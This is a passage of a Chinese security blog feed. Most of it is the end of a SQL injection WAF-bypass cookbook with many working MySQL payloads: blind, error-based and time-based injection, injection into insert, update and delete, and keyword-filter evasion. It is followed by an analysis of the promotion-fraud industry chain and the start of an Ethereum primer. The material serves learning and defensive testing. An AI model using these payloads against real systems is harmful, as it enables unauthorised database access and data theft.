class="line">),1,1))=&apos;f&apos;) as d group by d having d=1);</span><br></pre></td></tr></table></figure><p>如果表名第一个字符为<code>f</code>，则返回正常数据，如果不为<code>f</code>则返回空。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338669140591.jpg" alt=""></p><blockquote><p>绕group by<br>group by =&gt; group_concat()</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,title from freebuf where id=1 || (select substr((select replace(group_concat(distinct(case table_schema when &apos;SecSpider&apos; then table_name else &apos;&apos; end)), &quot;,&quot;, &quot;&quot;) from information_schema.tables),1,1)=&apos;f&apos;);</span><br></pre></td></tr></table></figure><p>同上，如果表名第一个字符为<code>f</code>，则返回正常数据，如果不为<code>f</code>则返回为空。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338669915616.jpg" alt=""></p><blockquote><p>绕select<br>其实是用了种取巧的方式即：<br>select =&gt; into outfile<br>但实际上是用处不大的，这边就不做演示了</p></blockquote><blockquote><p>绕hex<br>hex =&gt; lower(conv([10-36],10,36))</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338686000398.jpg" alt=""></p><blockquote><p>绕substr或substring()<br>substr =&gt; mid() 或 strcmp(left())</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mid()</span><br><span class="line">select (select mid(table_name,1,1) from information_schema.tables where table_schema=database() limit 1)=lower(conv(14,10,36));</span><br><span class="line"></span><br><span class="line">strcmp(left())</span><br><span class="line">select strcmp(left(table_name,1),&apos;f&apos;) from information_schema.tables where table_schema=database() limit 1;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338696469393.jpg" alt=""></p><h3 id="3-1-2-绕过严格的字符或数字限制"><a href="#3-1-2-绕过严格的字符或数字限制" class="headerlink" title="3.1.2 绕过严格的字符或数字限制"></a>3.1.2 绕过严格的字符或数字限制</h3><p>具体的来说，当waf做了严格的字符限制后，可能某些字符我们是无法使用的，这个时候可以用下面这张表来绕过：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338689725975.jpg" alt=""></p><p>小写字符的释放可以使用<code>lower(conv([10-36],10,36))</code></p><h3 id="3-1-3-绕过information-schema"><a href="#3-1-3-绕过information-schema" class="headerlink" title="3.1.3 绕过information.schema"></a>3.1.3 绕过<code>information.schema</code></h3><p>在MySQL5.6及以上的版本，可以用<code>mysql.innodb_table_stats</code>和<code>mysql.innodb._index_stats</code>来代替。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf where id=1 union select table_name from mysql.innodb_table_stats where database_name=database() limit 0,1;</span><br><span class="line"></span><br><span class="line">select title from freebuf where id=1 union select table_name from mysql.innodb_index_stats where database_name=database() limit 0,1;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341559722523.jpg" alt=""></p><h2 id="3-2-非常规注入方式"><a href="#3-2-非常规注入方式" class="headerlink" title="3.2 非常规注入方式"></a>3.2 非常规注入方式</h2><h3 id="3-2-1-order-by注入"><a href="#3-2-1-order-by注入" class="headerlink" title="3.2.1 order by注入"></a>3.2.1 order by注入</h3><p>为什么要把<code>order by</code>拉出来单独说呢，因为<strong><code>order by</code>后面不能使用union</strong>。</p><p>主要是用盲注，有两种姿势，下面用布尔盲注来演示。</p><ol><li><p>使用<code>if</code>来进行盲注：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf order by if((substr(user(),1,1)=&apos;a&apos;),1,(select 1 from information_schema.tables));</span><br></pre></td></tr></table></figure></li></ol><pre><code>这边要注意一下，在报错回显时一定要选择会产生错误的回显，而不要选择`0x00`，在`5.7.23`版本下`0x00`也会返回所有数据及正常情况。![](http://image-lucifaer.test.upcdn.net/2018/11/29/15338845878083.jpg)</code></pre><ol start="2"><li><p>使用<code>case when then else end</code>来进行盲注：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf order by (select case when(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&apos;f&apos;) then 1 else 1*(select 1 from information_schema.tables)end)=1 limit 0,1;</span><br></pre></td></tr></table></figure></li></ol><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15338850719592.jpg)</code></pre><ol start="3"><li><p>使用<code>procedure</code>进行报错注入或盲注：</p><p> <strong><code>limit</code>后的<code>procedure</code>在5.7.18下已经默认关闭了，在8.0版本下已经被移除。</strong></p><p> 报错注入：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 from mysql.user order by 1 limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li></ol><pre><code>时间盲注：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 from mysql.user order by 1 limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(50000000,SHA1(1)),1))))),1);</span><br></pre></td></tr></table></figure></code></pre><ol start="4"><li><p>使用<code>rand()</code>进行盲注</p><p> 这个不细说了，和普通的盲注一样。</p></li></ol><h3 id="3-2-2-limit注入"><a href="#3-2-2-limit注入" class="headerlink" title="3.2.2 limit注入"></a>3.2.2 limit注入</h3><p>重要的话再说一遍：</p><p><strong><code>limit</code>后的<code>procedure</code>在5.7.18下已经默认关闭了，在8.0版本下已经被移除。</strong></p><p>报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 from mysql.user order by 1 limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure><p>时间盲注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 from mysql.user order by 1 limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(50000000,SHA1(1)),1))))),1);</span><br></pre></td></tr></table></figure><h3 id="3-2-3-insert、update、delete注入"><a href="#3-2-3-insert、update、delete注入" class="headerlink" title="3.2.3 insert、update、delete注入"></a>3.2.3 insert、update、delete注入</h3><p>这边就拿报错注入来说了，其实改一改就是盲注。</p><ul><li><p>insert</p><p>  insert注入的位置在<code>value</code>处，可以配合常规的报错语句来完成报错注入，下面举个例子。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into freebuf (id, title, links, tag, article_id, catch_date, publish_date, come_from) values (2,&apos;1&apos; +  updatexml(0,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)),0) or &apos;&apos;,&apos;www.baidu.com&apos;,&apos;test1&apos;,&apos;2&apos;,&apos;1&apos;,&apos;1&apos;,&apos;baidu&apos;);</span><br></pre></td></tr></table></figure></li></ul><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341459544177.jpg)这边要注意一下在`value`中的报错语句要使用的逻辑，为了使我们的报错语句一定执行，一定要构造逻辑使得报错函数可以执行。</code></pre><ul><li><p>update</p><p>  update注入位置在<code>set</code>后。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update freebuf set id=3 and updatexml(0,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),0) and title=&apos;123&apos; and links=&apos;123&apos; and tag=&apos;1&apos; and article_id=&apos;123&apos; and catch_date=&apos;1&apos; and publish_date=&apos;3&apos; and come_from=&apos;1&apos; where id=2;</span><br></pre></td></tr></table></figure></li></ul><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341466190936.jpg)</code></pre><ul><li><p>delete</p><p>  delete注入的位置在<code>where</code>后。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE from freebuf where id=2 or updatexml(0,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),0) or &apos;&apos;;</span><br></pre></td></tr></table></figure></li></ul><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341468358998.jpg)</code></pre><h2 id="3-3-畸形请求"><a href="#3-3-畸形请求" class="headerlink" title="3.3 畸形请求"></a>3.3 畸形请求</h2><p>php+Apache 特性：</p><p>waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没有那么严格，所以在发包的时候修改为一个畸形的请求也可能绕过waf。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338886423466.jpg" alt=""></p><h2 id="3-4-HPP——通用特性"><a href="#3-4-HPP——通用特性" class="headerlink" title="3.4 HPP——通用特性"></a>3.4 HPP——通用特性</h2><p>HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。 假设提交的参数即为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;id=2&amp;id=3</span><br></pre></td></tr></table></figure><ul><li>Asp.net + iis：<code>id=1,2,3</code></li><li>Asp + iis：<code>id=1,2,3</code></li><li>Php + apache：<code>id=3</code></li></ul><h2 id="3-5-Trick"><a href="#3-5-Trick" class="headerlink" title="3.5 Trick"></a>3.5 Trick</h2><h3 id="3-5-1-利用name-const-获取MySQL版本信息"><a href="#3-5-1-利用name-const-获取MySQL版本信息" class="headerlink" title="3.5.1 利用name_const()获取MySQL版本信息"></a>3.5.1 利用<code>name_const()</code>获取MySQL版本信息</h3><p>在5.7.23版本中并不能使用<code>name_const()</code>来获取更多的信息，但是仍可以用它来获取数据库版本信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM freebuf WHERE id=2 or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a)or &apos;&apos;;</span><br></pre></td></tr></table></figure><h3 id="3-5-2-limit下的字段数的判断"><a href="#3-5-2-limit下的字段数的判断" class="headerlink" title="3.5.2 limit下的字段数的判断"></a>3.5.2 limit下的字段数的判断</h3><p>在<code>where</code>条件下的字段数可以用<code>order by</code>判断，而limit后可以利用<code>1, into @,@</code>（@为字段数）判断字段数。@为mysql临时变量，</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15335651448794.jpg" alt=""></p><p>这里要记住要赋予用户变量变量名，不然会出现<code>User variable name &#39;&#39; is illegal</code>错误。</p><h3 id="3-5-3-MySQL注入可报错时绕过information-schema等关键字的过滤（报错）"><a href="#3-5-3-MySQL注入可报错时绕过information-schema等关键字的过滤（报错）" class="headerlink" title="3.5.3 MySQL注入可报错时绕过information_schema等关键字的过滤（报错）"></a>3.5.3 MySQL注入可报错时绕过<code>information_schema</code>等关键字的过滤（报错）</h3><p><strong>首先，如果MySQL注入是报错注入，且waf拦截了information_schema、columns、tables、database、schema等关键字或函数时</strong>，我们还可以这样玩：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select i.4 from (select * from (select 1)a, (select 2)b, (select 3)c, (select 4)d, (select 5)e, (select 6)f, (select 7)g, (select 8)h union select * from freebuf)i;</span><br></pre></td></tr></table></figure><p>这里是因为我<code>freebuf</code>表有8个字段，因为利用了<code>union select</code>所以要构造8个字段。</p><p>那如果过滤了<code>union</code>呢？</p><ol><li><p>用<code>polgon()</code>爆表名和库名</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from freebuf where id=1 and polygon(id);</span><br></pre></td></tr></table></figure></li></ol><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341497758796.jpg)原理：`Polygon`从多个`LineString`或`WKB LineString`参数构造一个值 。如果任何参数不表示`LinearRing`（也就是说，不是一个封闭和简单的`LineString`），返回值就是NULL。如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</code></pre><ol start="2"><li><p>用<code>join</code>重复查询爆字段</p><p> 爆第一个字段</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from freebuf where id=1 and (select * from (select * from freebuf as a join freebuf as b)as c);</span><br></pre></td></tr></table></figure></li></ol><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341500322650.jpg)爆后面的字段<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from freebuf where id=1 and (select * from (select * from freebuf as a join freebuf as b using(id))as c);</span><br></pre></td></tr></table></figure>![](media/15335491010936/15341500679125.jpg)</code></pre><h3 id="3-5-4-八字节注入"><a href="#3-5-4-八字节注入" class="headerlink" title="3.5.4 八字节注入"></a>3.5.4 八字节注入</h3><p>这种注入的原理是在MySQL中字符串实际上作为八字节的DOUBLE类型来处理。</p><p>具体的举一个例子：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341508518816.jpg" alt=""></p><p>如果需要获取的数据大于八字节，可以使用<code>substr()</code>来将数据分成分片：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341510080235.jpg" alt=""></p><p>也就说<code>user()</code>最多有16个字符，那么现在解码就能看到我们需要获得的数据：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341511221900.jpg" alt=""></p><h3 id="3-5-5-局部变量的使用"><a href="#3-5-5-局部变量的使用" class="headerlink" title="3.5.5 局部变量的使用"></a>3.5.5 局部变量的使用</h3><p>为什么要使用局部变量呢？其实使用局部变量就是为了更改SQL语句的逻辑，比如针对于语义的waf过滤了<code>union select from</code>，那么就可以使用局部变量将语义更改为<code>select from union</code>，从而绕过逻辑判断。</p><p>举个例子：</p><p>过滤了如下的逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf where id=-1 union select table_name from information_schema.tables where table_schema=database() limit 0,1;</span><br></pre></td></tr></table></figure><p>可以看到这里的逻辑为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select from</span><br></pre></td></tr></table></figure><p>利用局部变量可以更改这样的逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf where id=1|@payload:=(select table_name from information_schema.tables where table_schema=database() limit 0,1) union select @payload;</span><br></pre></td></tr></table></figure><p>这样的逻辑为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select from union</span><br></pre></td></tr></table></figure><p>而且结果相同：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341536397391.jpg" alt=""></p><h3 id="3-5-6-emoji"><a href="#3-5-6-emoji" class="headerlink" title="3.5.6 emoji"></a>3.5.6 emoji</h3><p>这一点不多说，因为我自己没搞清楚，推荐<a href="https://xz.aliyun.com/t/368" target="_blank" rel="noopener">从容师傅的文章</a></p><h1 id="0x04-Desserts（甜点）"><a href="#0x04-Desserts（甜点）" class="headerlink" title="0x04 Desserts（甜点）"></a>0x04 Desserts（甜点）</h1><p>这里不说具体案例，只说一说思路。</p><h2 id="4-1-其他的绕过思路"><a href="#4-1-其他的绕过思路" class="headerlink" title="4.1 其他的绕过思路"></a>4.1 其他的绕过思路</h2><p>MySQL是满足图灵完备的，也就是说只要能找到具备循环和判断的，且未被过滤的函数，理论上是可以完成所有正常功能的。并且在不限制字段的情况下，是可以利用可用函数进行编程来完成你想要的自定义查询的。</p><h2 id="4-2-逻辑很重要"><a href="#4-2-逻辑很重要" class="headerlink" title="4.2 逻辑很重要"></a>4.2 逻辑很重要</h2><p>测waf得时候可以首先想一下waf的判别逻辑，最常见的测试为以下三种逻辑的测试：</p><ul><li>union+select</li><li>select+from</li><li>union+from</li></ul><p>利用前文的局部变量来更改逻辑，说不定会有更好的效果。在了解了过滤逻辑的情况下，绕过剩下的过滤就好说多了。</p><h2 id="4-3-见招拆招"><a href="#4-3-见招拆招" class="headerlink" title="4.3 见招拆招"></a>4.3 见招拆招</h2><p><code>%23%0a</code>被过滤了，那么<code>%2d%2d%0a</code>是否会被过滤呢？</p><p>过滤了<code>union、from</code>，那么<code>1e1union</code>是否被过滤了？<code>.1from</code>是否被过滤了呢？</p><p>下面说一个分析场景：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union+select拦截</span><br><span class="line">select+from拦截</span><br><span class="line">union+from不拦截</span><br></pre></td></tr></table></figure><p>可以看到关键点在于<code>select</code>。</p><p>那么现在想一想下面的问题：</p><ul><li><code>union+select</code>过滤了，那么<code>union/*!50000%0aselect%0aall*/</code>呢？</li><li>如果<code>select</code>被识别了，那么<code>select all</code>、<code>select distinct</code>、<code>select distinctrow</code>呢？</li><li>如果<code>union/*!50000%0aselect%0aall*/</code>被过滤了，那fuzz一下<code>50000</code>这个五位数呢？</li></ul><p>你看可以从这一点看到这么多，再结合前文说的各种方法，不愁没办法。细心是最重要的。</p><h2 id="4-4-非惯性思维"><a href="#4-4-非惯性思维" class="headerlink" title="4.4 非惯性思维"></a>4.4 非惯性思维</h2><ul><li>waf在检测时，对不同的访问方式利用不同的规则进行检测，而这就有可能钻空子。</li><li>对waf进行长度检测，过长的字符串可能导致waf跳过识别，也有可能直接导致服务器宕机。</li></ul><h1 id="0x05-Coffee-Or-Tea"><a href="#0x05-Coffee-Or-Tea" class="headerlink" title="0x05 Coffee Or Tea"></a>0x05 Coffee Or Tea</h1><p>总结了这么多，也算是把各家的姿势还有自己的一点认识写完了（其实大部分还是学习各位师傅的姿势）。为了总结这一份cookbook，也算是花了快一周多的时间，主要参考了以下的文章：</p><ul><li><a href="https://xz.aliyun.com/t/368" target="_blank" rel="noopener">https://xz.aliyun.com/t/368</a></li><li><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></li><li><a href="https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html</a></li><li><a href="http://blog.51cto.com/wt7315/1891458" target="_blank" rel="noopener">http://blog.51cto.com/wt7315/1891458</a></li><li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/ModSecurity-SQL-Injection-Challenge--Lessons-Learned/" target="_blank" rel="noopener">https://www.trustwave.com/Resources/SpiderLabs-Blog/ModSecurity-SQL-Injection-Challenge–Lessons-Learned/</a></li></ul><p>本文长期更新，有新的姿势就会添加进来。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于SQLi的一点总结，用于自查。&lt;/p&gt;
    
    </summary>
    
      <category term="技术总结" scheme="https://lucifaer.com/categories/%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="CookBook" scheme="https://lucifaer.com/tags/CookBook/"/>
    
      <category term="SQL注入" scheme="https://lucifaer.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>薅羊毛产业链分析</title>
    <link href="https://lucifaer.com/2018/07/19/%E8%96%85%E7%BE%8A%E6%AF%9B%E4%BA%A7%E4%B8%9A%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/07/19/薅羊毛产业链分析/</id>
    <published>2018-07-19T07:19:09.000Z</published>
    <updated>2018-11-29T09:28:03.783Z</updated>
    
    <content type="html"><![CDATA[<p>羊毛党会根据不同的业务情况使用不同方法完成相应的工作。下面举例两个较为不同的场景来简要的说一下薅羊毛的产业链。</p><a id="more"></a><h1 id="0x01-批量注册"><a href="#0x01-批量注册" class="headerlink" title="0x01 批量注册"></a>0x01 批量注册</h1><p>大致的流程如下图</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E6%89%B9%E9%87%8F%E6%B3%A8%E5%86%8C.png" alt="批量注册"></p><p>接下来粗略谈一下其中的各个环节。</p><h2 id="1-手机卡商"><a href="#1-手机卡商" class="headerlink" title="1. 手机卡商"></a>1. 手机卡商</h2><p>手机卡商属于整个产业链最上游的群体，数量众多的卡商们，手中拥有着大量的手机卡，为各大接码平台提供源源不断的号码服务，在风控领域中被称作“虚拟号码”。</p><p>卡商主要做两个事情，一个是用猫池养卡，二是将短信验证码发给打码平台。</p><p>猫池简单来说就是模拟成手机终端的设备，将猫池连接到PC上后，可以利用猫池软件对手机卡进行管理，主要功能包括：设置通道对应的手机号、自动读取短信、发送短信、拨打指定号码、批量设置呼叫转移等。猫池也同时充当养卡的平台，使运营商系统上显示这些卡为开机状态，从而能使这些卡正常工作。</p><p>通过猫池配合接码人员或机器学习的配合，可以完成一个系统化的接码平台，即在进行注册的时候自动接收手机短信或验证码信息，并将验证码提取出来。这样就完成了整个产业链的第一步。</p><h2 id="2-打码平台"><a href="#2-打码平台" class="headerlink" title="2. 打码平台"></a>2. 打码平台</h2><p>打码平台是整个产业链中最为关键的一环，可以说打码平台的进步使得薅羊毛的产业链成本越来越低。</p><p>打码平台接收接码平台中的验证码信息，利用深度学习或人工识别的方法，完成验证码的批量识别。这样就能过掉人机识别，完成正常的注册。</p><h2 id="3-羊毛党的后续工作"><a href="#3-羊毛党的后续工作" class="headerlink" title="3. 羊毛党的后续工作"></a>3. 羊毛党的后续工作</h2><p>羊毛党从中间商购买自动化打码工具，并准备批量注册工具以及自动薅羊毛的工具，就可以针对目标商家完成全自动的薅羊毛流程。在获取到大量的资源后，利用不同的变现手段如：淘宝、咸鱼、各种群，将这些资源卖出去后，就实现了营收。 </p><h1 id="0x02-刷量"><a href="#0x02-刷量" class="headerlink" title="0x02 刷量"></a>0x02 刷量</h1><p>大致的流程如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E5%88%B7%E9%87%8F.png" alt="刷量"></p><h2 id="1-改机工具"><a href="#1-改机工具" class="headerlink" title="1. 改机工具"></a>1. 改机工具</h2><p>改机工具是通过劫持系统函数来对设备信息进行篡改，来绕过风控策略。在运行改机工具时需要首先对设备进行root（或者越狱）。主要是使用这么几种方法：</p><ul><li>Android hook<br>  Android改机工具大部分是基于xposed框架做的插件，通过HOOK方式修改IMEI，IMSI，手机号，MAC地址，手机硬件信息，地理位置，安装包列表等</li><li>IOS hook<br>  主要是基于cydia框架做的插件，通过HOOK修改设备参数。一些高级的工具还提供了多开和一件新机功能。</li><li><p>Android模拟器</p><p>  并不算真正的改机工具</p></li></ul><p>看到一些资料说黑产对hook检测的对抗已经转向自定制ROM的Android模拟器，会集成一键新机功能，每次启动所有的系统参数都会随机变化。更为难以识别。</p><h2 id="2-按键精灵"><a href="#2-按键精灵" class="headerlink" title="2. 按键精灵"></a>2. 按键精灵</h2><p>通过lua编写的脚本来回放用户的触摸痕迹和输入操作。在风控时是比较难以识别的。</p><h2 id="3-群控系统"><a href="#3-群控系统" class="headerlink" title="3. 群控系统"></a>3. 群控系统</h2><p>群控系统简单来说是利用PC来管理真机，并模仿真人自动完成相应的操作。群控系统一般用来配合卡商完成较大规模的产业化的工作。一般围绕微信的营销展开，进行微商的推广等操作，赚取营销毛利。</p><p>当群控系统、改机工具和按键精灵结合到一起的时候，对于平台来说就是灾难性的。配合到上文所说的接码平台，能够大幅度的提升薅羊毛的效率和成功率。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;羊毛党会根据不同的业务情况使用不同方法完成相应的工作。下面举例两个较为不同的场景来简要的说一下薅羊毛的产业链。&lt;/p&gt;
    
    </summary>
    
      <category term="黑产研究" scheme="https://lucifaer.com/categories/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="黑产研究" scheme="https://lucifaer.com/tags/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
      <category term="薅羊毛" scheme="https://lucifaer.com/tags/%E8%96%85%E7%BE%8A%E6%AF%9B/"/>
    
  </entry>
  
  <entry>
    <title>以太坊简介</title>
    <link href="https://lucifaer.com/2018/06/18/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%AE%80%E4%BB%8B/"/>
    <id>https://lucifaer.com/2018/06/18/以太坊简介/</id>
    <published>2018-06-18T12:08:44.000Z</published>
    <updated>2018-08-09T02:36:58.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以太坊的目的是基于脚本、竞争币和链上元协议（on-chain meta-protocol）概念进行整合和提高，使得开发者能够创建任意的基于共识的、可扩展的、标准化的、特性完备的、易于开发的和协同的应用。以太坊通过建立终极的抽象的基础层-内置有图灵完备编程语言的区块链-使得任何人都能够创建合约和去中心化应用并在其中设立他们自由定义的所有权规则、交易方式和状态转换函数。域名币的主体框架只需要两行代码就可以实现，诸如货币和信誉系统等其它协议只需要不到二十行代码就可以实现。智能合约-包含价值而且只有满足某些条件才能打开的加密箱子-也能在我们的平台上创建，并且因为图灵完备性、价值知晓（value-awareness）、区块链知晓（blockchain-awareness）和多状态所增加的力量而比比特币脚本所能提供的智能合约强大得多。</p></blockquote><p>上面是以太坊白皮书上对以太坊的介绍，其实简单来说，以太坊就是一个框架，利用这个框架开发出的应用叫智能合约。</p><a id="more"></a><h1 id="0x00-以太坊账户"><a href="#0x00-以太坊账户" class="headerlink" title="0x00 以太坊账户"></a>0x00 以太坊账户</h1><p>在以太坊系统中，状态是由被称为“账户”（每个账户是一个20字节的地址）的对象和在两个账户之间转移价值和信息的状态转换系统构成的。“账户”包含四个部分：</p><ul><li>随机数，用于确定每笔交易只能被处理一次的计数器</li><li>账户目前的以太币余额</li><li>账户的合约代码，如果有的话</li><li>账户的存储（默认为空）</li></ul><p>以太币（Ether）是以太坊内部的主要加密燃料，用于支付交易费用。一般而言，以太坊有两种类型的账户：外部所有的账户（由私钥控制的）和合约账户（由合约代码控制）。</p><p>外部账户可以简单理解为使用服务的用户，合约用户可以简单理解为提供服务的内部工作人员。</p><p>外部所有的账户没有代码，人们可以通过创建和签名一笔交易从一个外部账户发送消息。每当合约账户收到一条消息，合约内部的代码就会被激活，允许它对内部存储进行读取和写入，和发送其它消息或者创建合约。</p><h1 id="0x01-以太坊的消息"><a href="#0x01-以太坊的消息" class="headerlink" title="0x01 以太坊的消息"></a>0x01 以太坊的消息</h1><p>以太坊的消息在某种程度上和比特币交易很像，区别在于以下三点：</p><ul><li>以太坊的消息可以由外部实体或者合约创建，然而比特币的交易只能从外部创建。</li><li>以太坊消息可以选择包含数据。</li><li>如果以太坊消息的接受者是合约账户，可以选择进行回应，这意味着以太坊消息也包含函数概念。</li></ul><h1 id="0x02-以太坊的交易"><a href="#0x02-以太坊的交易" class="headerlink" title="0x02 以太坊的交易"></a>0x02 以太坊的交易</h1><p>这部分我觉得干说不是很形象，用从论坛中的一位大哥的代码分析来形象的说明一下。首先要明确的一点，以太坊上的应用都是通过智能合约与区块链进行交互的，而只能合约的执行是由交易触发的，可以说在以太坊中，一切都源于交易。源码在<a href="https://github.com/ethereum" target="_blank" rel="noopener">https://github.com/ethereum</a>。想看的话可以自己跟着<a href="https://blog.csdn.net/omnispace/article/details/79311891" target="_blank" rel="noopener">这篇文章</a>看。</p><h2 id="1-以太坊交易的数据结构"><a href="#1-以太坊交易的数据结构" class="headerlink" title="1. 以太坊交易的数据结构"></a>1. 以太坊交易的数据结构</h2><p>在<code>core/types/transaction.go</code>中有交易的数据结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">data txdata</span><br><span class="line"><span class="comment">// caches</span></span><br><span class="line">hash atomic.Value</span><br><span class="line">size atomic.Value</span><br><span class="line">from atomic.Value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到只有<code>data</code>一个字段，其他三个字段都是缓存字段。<code>txdata</code>也是一个结构体，就在这段代码的下面：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td 